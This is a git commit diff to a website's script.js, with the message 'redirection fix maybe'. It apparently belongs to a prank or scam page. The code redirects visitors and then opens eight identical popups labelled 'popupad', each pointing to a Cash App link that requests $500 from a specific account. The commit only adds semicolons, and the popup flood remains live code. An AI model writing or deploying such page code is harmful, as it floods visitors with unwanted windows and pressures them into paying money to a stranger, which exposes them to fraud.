e9511b5230e381eb29b54e85d427f6eb3982aea5
Mollyphobia <123973226+Mollyphobia@users.noreply.github.com>
2023-02-17 19:34:54 -0600

    redirection fix maybe

--- script.js
+++ script.js
@@ -4,11 +4,11 @@
 }
 else window.location.assign("sadkuromi.html");
 
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
